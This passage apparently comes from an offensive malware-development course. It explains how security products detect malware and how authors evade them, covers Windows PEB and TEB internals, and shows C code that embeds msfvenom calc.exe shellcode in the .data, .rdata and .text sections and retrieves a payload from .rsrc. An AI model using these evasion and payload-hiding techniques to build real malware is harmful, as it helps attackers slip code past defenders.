Since signature detection methods are easily circumvented with minor changes to a malicious file, heuristic detection was introduced to spot suspicious characteristics that can be found in unknown, new and modified versions of existing malware. Depending on the security solution, heuristic models can consist of one or both of the following:

- **Static Heuristic Analysis**??- Involves decompiling the suspicious program and comparing code snippets to known malware that are already known and are in the heuristic database. If a particular percentage of the source code matches anything in the heuristic database, the program is flagged.
    
- **Dynamic Heuristic Analysis**??- The program is placed inside a virtual environment or a??_sandbox_??which is then analyzed by the security solution for any suspicious behaviors.
    

#### Dynamic Heuristic Analysis (Sandbox Detection)

Sandbox detection dynamically analyzes the behavior of a file by executing it in a sandboxed environment. While executing the file, the security solution will look for suspicious actions or actions that are classified as malicious. For example, allocating memory is not necessarily a malicious action but allocating memory, connecting to the internet to fetch shellcode, writing the shellcode to memory and executing it in that sequence is considered malicious behavior.

Malware developers will embed anti-sandbox techniques to detect the sandbox environment. If the malware confirms that it's being executed in a sandbox then it executes benign code, otherwise, it executes malicious code.

### Behavior-based Detection

Once the malware is running, security solutions will continue to look for suspicious behavior committed by the running process. The security solution will look for suspicious indicators such as loading a DLL, calling a certain Windows API and connecting to the internet. Once the suspicious behavior is detected the security solution will conduct an in-memory scan of the running process. If the process is determined to be malicious, it is terminated.

Certain actions may terminate the process immediately without an in-memory scan being performed. For example, if the malware performs process injection into??`notepad.exe`??and connects to the internet, this will likely cause the process to be terminated immediately due to the high likelihood that this is malicious activity.

The best way to avoid behavior-based detection is by making the process behave as benign as possible (e.g. avoid spawning a cmd.exe child process). Additionally, in-memory scans can be circumvented with memory encryption. This is a more advanced topic that will be discussed in future modules.

### API Hooking

API hooking is a technique used by security solutions, mainly EDRs, to monitor the process or code execution in real time for malicious behaviors. API hooking works by intercepting commonly abused APIs and then analyzing the parameters of these APIs in real time. This is a powerful way of detection because it allows the security solution to see the content passed to the API after it's been de-obfuscated or decrypted. This detection is considered a combination of real-time and behavior-based detection.

The diagram below shows a high level of API hooking.

![API-Hooking](https://maldevacademy.s3.amazonaws.com/images/Basic/detection-mechanisms/api-hooking.png)

There are several ways to bypass API hooks such as DLL unhooking and direct syscalls. These topics will be covered in future modules.

### IAT Checking

One of the components that were discussed in the PE structure is the Import Address Table or IAT. To briefly summarize the IAT's functionality, it contains function names that are used in the PE at runtime. It also contains the libraries (DLLs) that export these functions. This information is valuable to a security solution since it knows what WinAPIs the executable is using.

For example, ransomware is used to encrypt files and therefore it will likely be using cryptographic and file management functions. When the security solution sees the IAT containing these types of functions such as??`CreateFileA/W, SetFilePointer, Read/WriteFile, CryptCreateHash, CryptHashData, CryptGetHashParam`, then either the program is flagged or additional scrutiny is placed on it. The image below shows the??`dumpbin.exe`??tool being used to check a binary's IAT.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/dumpbin-imports.png)

One solution that evades IAT scanning is the use of API hashing which will be discussed in future modules.

### Manual Analysis

Despite bypassing all the aforementioned detection mechanisms, the blue team and malware analysts can still manually analyze the malware. A defender well-versed in malware reverse engineering will likely be able to detect the malware. Furthermore, security solutions will often send a copy of suspicious files to the cloud for further analysis.

Malware developers can implement anti-reversing techniques to make the process of reverse engineering more difficult. Some techniques include the detection of a debugger and the detection of a virtualized environment which are discussed in future modules.
# 1.9 Windows Processes

### What is a Windows Process?

A Windows process is a program or application that is running on a Windows machine. A process can be started by either a user or by the system itself. The process consumes resources such as memory, disk space, and processor time to complete a task.

### Process Threads

Windows processes are made up of one or more threads that are all running concurrently. A thread is a set of instructions that can be executed independently within a process. Threads within a process can communicate and share data. Threads are scheduled for execution by the operating system and managed in the context of a process.

### Process Memory

Windows processes also use memory to store data and instructions. Memory is allocated to a process when it is created and the amount that is allocated can be set by the process itself. The operating system manages memory using both virtual and physical memory. Virtual memory allows the operating system to use more memory than what is physically available by creating a virtual address space that can be accessed by the applications. These virtual address spaces are divided into "pages" which are then allocated to processes.

### Memory Types

Processes can have different types of memory:

- **Private memory**??is dedicated to a single process and cannot be shared by other processes. This type of memory is used to store data that is specific to the process.
    
- **Mapped memory**??can be shared between two or more processes. It is used to share data between processes, such as shared libraries, shared memory segments, and shared files. Mapped memory is visible to other processes, but is protected from being modified by other processes.
    
- **Image memory**??contains the code and data of an executable file. It is used to store the code and data that is used by the process, such as the program's code, data, and resources. Image memory is often related to DLL files loaded into a process's address space.
    

### Process Environment Block (PEB)

The Process Environment Block (PEB) is a data structure in Windows that contains information about a process such as its parameters, startup information, allocated heap information, and loaded DLLs, in addition to others. It is used by the operating system to store information about processes as they are running, and is used by the Windows loader to launch applications. It also stores information about the process such as the process ID (PID) and the path to the executable.

Every process created has its own PEB data structure, that will contain its own set of information about it.

### PEB Structure

The PEB struct in C is shown below. The reserved members of this struct can be ignored.

```c
typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  PVOID                         Reserved4[3];
  PVOID                         AtlThunkSListPtr;
  PVOID                         Reserved5;
  ULONG                         Reserved6;
  PVOID                         Reserved7;
  ULONG                         Reserved8;
  ULONG                         AtlThunkSListPtr32;
  PVOID                         Reserved9[45];
  BYTE                          Reserved10[96];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved11[128];
  PVOID                         Reserved12[1];
  ULONG                         SessionId;
} PEB, *PPEB;
```

The non-reserved members are explained below.

#### BeingDebugged

BeingDebugged is a flag in the PEB structure that indicates whether the process is being debugged or not. It is set to 1 (TRUE) when the process is being debugged and 0 (FALSE) when it is not. It is used by the Windows loader to determine whether to launch the application with a debugger attached or not.

#### Ldr

Ldr is a pointer to a??`PEB_LDR_DATA`??structure in the Process Environment Block (PEB). This structure contains information about the process's loaded dynamic link library (DLL) modules. It includes a list of the DLLs loaded in the process, the base address of each DLL, and the size of each module. It is used by the Windows loader to keep track of DLLs loaded in the process. The??`PEB_LDR_DATA`??struct is shown below.

```c
typedef struct _PEB_LDR_DATA {
  BYTE       Reserved1[8];
  PVOID      Reserved2[3];
  LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;
```

`Ldr`??can be leveraged to find the base address of a particular DLL, as well as which functions reside within its memory space. This will be used in future modules to build a custom version of??[GetModuleHandleA/W](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea)??for added stealth.

#### ProcessParameters

ProcessParameters is a data structure in the PEB. It contains the command line parameters passed to the process when created. The Windows loader adds these parameters to the process's PEB structure. ProcessParameters is a pointer to the??`RTL_USER_PROCESS_PARAMETERS`??struct that's shown below.

```c
typedef struct _RTL_USER_PROCESS_PARAMETERS {
  BYTE           Reserved1[16];
  PVOID          Reserved2[10];
  UNICODE_STRING ImagePathName;
  UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
```

`ProcessParameters`??will be leveraged in future modules to perform actions such as command line spoofing.

#### AtlThunkSListPtr & AtlThunkSListPtr32

`AtlThunkSListPtr`??and??`AtlThunkSListPtr32`??are used by the ATL (Active Template Library) module to store a pointer to a linked list of??_thunking functions_. Thunking functions are used to call functions that are implemented in a different address space, these often represent functions exported from a DLL (Dynamic Link Library) file. The linked list of thunking functions is used by the ATL module to manage the thunking process.

#### PostProcessInitRoutine

The??`PostProcessInitRoutine`??field in the PEB structure is used to store a pointer to a function that is called by the operating system after TLS (Thread Local Storage) initialization has been completed for all threads in the process. This function can be used to perform any additional initialization tasks that are required for the process.

TLS and TLS callbacks will be discussed in more detail later when required.

#### SessionId

The SessionID in the PEB is a unique identifier assigned to a single session. It is used to track the activity of the user during the session.

### Thread Environment Block (TEB)

Thread Environment Block (TEB) is a data structure in Windows that stores information about a thread. It contains the thread's environment, security context, and other related information. It is stored in the thread's stack and is used by the Windows kernel to manage threads.

### TEB Structure

The TEB struct in C is shown below. The reserved members of this struct can be ignored.

```c
typedef struct _TEB {
  PVOID Reserved1[12];
  PPEB  ProcessEnvironmentBlock;
  PVOID Reserved2[399];
  BYTE  Reserved3[1952];
  PVOID TlsSlots[64];
  BYTE  Reserved4[8];
  PVOID Reserved5[26];
  PVOID ReservedForOle;
  PVOID Reserved6[4];
  PVOID TlsExpansionSlots;
} TEB, *PTEB;
```

#### ProcessEnvironmentBlock (PEB)

Is a pointer to the PEB structure explained above, PEB is located inside the Thread Environment Block (TEB) and is used to store information about the currently running process.

#### TlsSlots

The TLS (Thread Local Storage) Slots are locations in the TEB that are used to store thread-specific data. Each thread in Windows has its own TEB, and each TEB has a set of TLS slots. Applications can use these slots to store data that is specific to that thread, such as thread-specific variables, thread-specific handles, thread-specific states, and so on.

#### TlsExpansionSlots

The TLS Expansion Slots in the TEB are a set of pointers used to store thread-local storage data for a thread. The TLS Expansion Slots are reserved for use by system DLLs.

### Process And Thread Handles

On the Windows operating system, each process has a distinct process identifier or process ID (PID) which the operating system assigns when the process is created. PIDs are used to distinguish one running process from another. The same concept applies to a running thread, where a running thread has a unique ID that is used to differentiate it from the rest of the existing threads (in any process) on the system.

These identifiers can be used to open a handle to a process or a thread using the WinAPIs below.

- [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)??- Opens an existing process object handle via its identifier.
    
- [OpenThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread)??- Opens an existing thread object handle via its identifier.
    

These WinAPIs will be discussed in further detail later on when required. For now, it's enough to know that the opened handle can be used to perform further actions to its relative Windows object, such as suspending a process or thread.

Handles should always be closed once their use is no longer required to avoid??[handle leaking](https://en.wikipedia.org/wiki/Handle_leak). This is achieved via the??[CloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)??WinAPI call.
# 2.0 Undocumented Structures

### Introduction

When referencing the Windows documentation for a structure, one may encounter several??_reserved_??members within the structure. These reserved members are often presented as arrays of??`BYTE`??or??`PVOID`??data types. This practice is implemented by Microsoft to maintain confidentiality and prevent users from understanding the structure to avoid modifications to these reserved members.

With that being said, throughout this course, it will be necessary to work with these undocumented members. Therefore, some modules will avoid using Microsoft's documentation and instead use other websites that have the full undocumented structure, which was likely derived through reverse engineering.

### PEB Structure Example

As mentioned in an earlier module, the Process Environment Block or PEB is a data structure that holds information about a Windows process. However,??[Microsoft's documentation](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)??on the PEB structure shows several reserved members. This makes it difficult to access the members of the structure.

```c
typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  PVOID                         Reserved4[3];
  PVOID                         AtlThunkSListPtr;
  PVOID                         Reserved5;
  ULONG                         Reserved6;
  PVOID                         Reserved7;
  ULONG                         Reserved8;
  ULONG                         AtlThunkSListPtr32;
  PVOID                         Reserved9[45];
  BYTE                          Reserved10[96];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved11[128];
  PVOID                         Reserved12[1];
  ULONG                         SessionId;
} PEB, *PPEB;
```

#### Finding Reserved Members

One way to determine what the PEB's reserved members hold is through the??`!peb`??command in??[WinDbg](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools).

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/undocumented-structs-1224531910-413779d5-2e1d-4813-a545-c690892da2bd.png)

For a more complete PEB structure, refer to Process Hacker's??[PEB structure](https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpebteb.h#L56).

### Alternative Documentation

As previously mentioned, some modules will avoid using Microsoft's documentation and instead use other documentation sources.

- [Process Hacker's Header Files](https://github.com/winsiderss/systeminformer/tree/master/phnt/include)
    
- [undocumented.ntinternals.net](https://web.archive.org/web/20230401045934/http://undocumented.ntinternals.net/)??- Some structures may be outdated
    
- [ReactOS's Documentation](https://doxygen.reactos.org/globals_type.html)
    
- [Vergilius Project](https://www.vergiliusproject.com/)??- Although mainly for Windows kernel structures, it remains a valuable resource.
    

### Considerations

When choosing a structure definition, it's important to be mindful of the following points.

- Some structure definitions only work for a specific architecture, either x86 or x64. If that's the case, ensure the appropriate structure definition is chosen.
    
- In certain cases, it may be necessary to define multiple structures due to the concept of nested structures. For example, a structure such as PEB may contain a member that acts as a pointer to another structure. Therefore, it becomes important to include the definition of the latter structure to ensure its correctly interpreted by the program.
    
- When using a custom definition of a structure, it is not possible to include its original definition found in the Windows SDK simultaneously. For example, Microsoft's definition of the PEB structure is located in??[Winternl.h](https://learn.microsoft.com/en-us/windows/win32/api/winternl/#structures). If one intends to use a different definition from one of the above-mentioned documentation sources, then attempting to include??`Winternl.h`??in the program will result in redefinition errors thrown by Visual Studio's compiler. To avoid this, select only one definition of the structure.
# 2.1 Payload Placement - .data & .rdata Sections

### Introduction

As a malware developer, one will have several options as to where the payload can be stored within the PE file. Depending on the choice, the payload will reside in a different section within the PE file. Payloads can be stored in one of the following PE sections:

- `.data`
- `.rdata`
- `.text`
- `.rsrc`

This module demonstrates how to store payloads in the??`.data`??and??`.rdata`??PE sections.

### .data Section

The??`.data`??section of a PE file is a section of a program's executable file that contains initialized global and static variables. This section is readable and writable, making it suitable for an encrypted payload that requires decryption during runtime. If the payload is a global or local variable, it will be stored in the??`.data`??section, depending on the compiler settings.

The code snippet below shows an example of having a payload stored in the??`.data`??section.

```c
#include <Windows.h>
#include <stdio.h>

// msfvenom calc shellcode
// msfvenom -p windows/x64/exec CMD=calc.exe -f c 
// .data saved payload
unsigned char Data_RawData[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

int main() {

	printf("[i] Data_RawData var : 0x%p \n", Data_RawData);
	printf("[#] Press <Enter> To Quit ...");
	getchar();
	return 0;
}

```

The image below shows the output of the above code snippet in xdbg. Make note of a few items within the image:

1. The .data section starts at the address??`0x00007FF7B7603000`.

2. The??`Data_RawData`'s base address is??`0x00007FF7B7603040`??which is an offset of??`0x40`??from the .data section.

3. Note the memory protection of the region is specified as??`RW`??which indicates it is a read-write region.


![image](https://maldevacademy.s3.amazonaws.com/images/Basic/.data-section.png)

### .rdata Section

Variables that are specified using the??`const`??qualifier are written as constants. These types of variables are considered "read-only" data. The letter "r" in??`.rdata`??indicates this, and any attempt to change these variables will cause access violations. Furthermore, depending on the compiler and its settings, the??`.data`??and??`.rdata`??sections may be merged, or even merged into the??`.text`??section.

The code snippet below shows an example of having a payload stored in the??`.rdata`??section. The code will essentially be the same as the previous code snippet except the variable is now preceded by the??`const`??qualifier.

```c
#include <Windows.h>
#include <stdio.h>

// msfvenom calc shellcode
// msfvenom -p windows/x64/exec CMD=calc.exe -f c 
// .rdata saved payload
const unsigned char Rdata_RawData[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

int main() {

	printf("[i] Rdata_RawData var : 0x%p \n", Rdata_RawData);
	printf("[#] Press <Enter> To Quit ...");
	getchar();
	return 0;
}
```

The image below shows the output of running??[dumpbin.exe](https://learn.microsoft.com/en-us/cpp/build/reference/dumpbin-reference?view=msvc-170)??on the PE file. Installing Visual Studio's C++ runtime will automatically download dumpbin.exe.

Command:??`dumpbin.exe /ALL <binary-file.exe>`

Scroll down and view the details of the??`.rdata`??section which contains the data stored in its raw binary format.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/dumpbin-1.png)

  

Scrolling down further shows the allocated payload which is highlighted in the image below.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/dumpbin-2.png)
# 2.2 Payload Placement - .text Section

### Introduction

The previous module discussed storing payloads in the??`.data`??and??`.rdata`??sections, while this module covers storing payloads in the??`.text`??section.

### .text Section

Saving the variables in the??`.text`??section differs from saving them in the??`.data`??or??`.rdata`??sections, as it is not just a matter of declaring a random variable. Rather, one must instruct the compiler to save it in the??`.text`??section, which is demonstrated in the code snippet below.

```c
#include <Windows.h>
#include <stdio.h>

// msfvenom calc shellcode
// msfvenom -p windows/x64/exec CMD=calc.exe -f c 
// .text saved payload
#pragma section(".text")
__declspec(allocate(".text")) const unsigned char Text_RawData[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

int main() {

	printf("[i] Text_RawData var : 0x%p \n", Text_RawData);
	printf("[#] Press <Enter> To Quit ...");
	getchar();
	return 0;
}
```

Here, the compiler is told to place the??`Text_rawData`??variable in the??`.text`??section instead of the??`.rdata`??section. The??`.text`??section is special in that it stores variables with executable memory permissions, allowing them to be executed directly without the need for editing the memory region permissions. This is useful for small payloads that are roughly less than 10 bytes.

Inspecting the binary compiled from the above code snippet using the PE-Bear tool reveals that the payload is located in the??`.text`??region.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/.text-section.png)
# 2.3 Payload Placement - .rsrc Section

### Introduction

Saving the payload in the??`.rsrc`??section is one of the best options as this is where most real-world binaries save their data. It is also a cleaner method for malware authors, since larger payloads cannot be stored in the??`.data`??or??`.rdata`??sections due to size limits, leading to errors from Visual Studio during compilation.

### .rsrc Section

The steps below illustrate how to store a payload in the??`.rsrc`??section.

1.Inside Visual Studio, right-click on 'Resource files' then click Add > New Item.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/.rsrc-1.png)

2.Click on 'Resource File'.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/.rsrc-2.png)

3.This will generate a new sidebar, the Resource View. Right-click on the .rc file (Resource.rc is the default name), and select the 'Add Resource' option.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/.rsrc-3.png)

4.Click 'Import'.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/.rsrc-4.png)

5.Select the calc.ico file, which is the raw payload renamed to have the??`.ico`??extension.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/.rsrc-5.png)

6.A prompt will appear requesting the resource type. Enter "RCDATA" without the quotes.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/.rsrc-6.png)

7.After clicking OK, the payload should be displayed in raw binary format within the Visual Studio project

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/.rsrc-7.png)

8.When exiting the Resource View, the "resource.h" header file should be visible and named according to the .rc file from Step 2. This file contains a define statement that refers to the payload's ID in the resource section (IDR_RCDATA1). This is important in order to be able to retrieve the payload from the resource section later.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/.rsrc-8.png)

Once compiled, the payload will now be stored in the??`.rsrc`??section, but it cannot be accessed directly. Instead, several WinAPIs must be used to access it.

- [FindResourceW](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-findresourcew)??- Get the location of the specified data stored in the resource section of a special ID passed in (this is defined in the header file)
    
- [LoadResource](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource)??- Retrieves a??`HGLOBAL`??handle of the resource data. This handle can be used to obtain the base address of the specified resource in memory.
    
- [LockResource](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-lockresource)??- Obtain a pointer to the specified data in the resource section from its handle.
    
- [SizeofResource](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-sizeofresource)??- Get the size of the specified data in the resource section.
    

The code snippet below will utilize the above Windows APIs to access the??`.rsrc`??section and fetch the payload address and size.

```c
#include <Windows.h>
#include <stdio.h>
#include "resource.h"

int main() {

	HRSRC		hRsrc                   = NULL;
	HGLOBAL		hGlobal                 = NULL;
	PVOID		pPayloadAddress         = NULL;
	SIZE_T		sPayloadSize            = NULL;

	
	// Get the location to the data stored in .rsrc by its id *IDR_RCDATA1*
	hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL) {
		// in case of function failure 
		printf("[!] FindResourceW Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get HGLOBAL, or the handle of the specified resource data since its required to call LockResource later
	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		// in case of function failure 
		printf("[!] LoadResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the address of our payload in .rsrc section
	pPayloadAddress = LockResource(hGlobal);
	if (pPayloadAddress == NULL) {
		// in case of function failure 
		printf("[!] LockResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the size of our payload in .rsrc section
	sPayloadSize = SizeofResource(NULL, hRsrc);
	if (sPayloadSize == NULL) {
		// in case of function failure 
		printf("[!] SizeofResource Failed With Error : %d \n", GetLastError());
		return -1;
	}
	
	// Printing pointer and size to the screen
	printf("[i] pPayloadAddress var : 0x%p \n", pPayloadAddress);
	printf("[i] sPayloadSize var : %ld \n", sPayloadSize);
	printf("[#] Press <Enter> To Quit ...");
	getchar();
	return 0;
}
```

